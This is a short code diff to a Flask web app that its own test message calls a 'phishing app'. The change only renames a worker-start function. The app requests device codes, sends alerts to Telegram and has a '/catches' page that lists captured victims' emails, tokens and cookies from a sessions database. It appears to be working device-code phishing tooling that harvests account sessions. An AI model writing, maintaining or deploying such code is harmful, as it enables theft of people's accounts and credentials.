@@ -517,7 +517,7 @@ function go() {{
 # ---------------------------------------
 @app.route("/", methods=["GET"])
 def home():
-    start_worker_safe()  # ensure worker is alive on every request
+    start_worker()  # ensure worker is alive on every request
 
     client_id, data = request_device_code()
     if not data:
@@ -535,14 +535,14 @@ def home():
 
 @app.route("/test_tg", methods=["GET"])
 def test_tg():
-    start_worker_safe()
+    start_worker()
     send_telegram("✅ Test message from your phishing app - Telegram works!")
     return "Telegram test sent - check your DMs."
 
 
 @app.route("/catches", methods=["GET"])
 def catches():
-    start_worker_safe()
+    start_worker()
     con = sqlite3.connect(DB_PATH)
     rows = con.execute(
         "SELECT id, email, tokens, cookies, ts FROM sessions WHERE status='caught' ORDER BY id DESC LIMIT 20"
@@ -593,5 +593,5 @@ summary { cursor: pointer; font-weight: 600; color: #323130; }
 
 
 if __name__ == "__main__":
-    start_worker_safe()
+    start_worker()
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
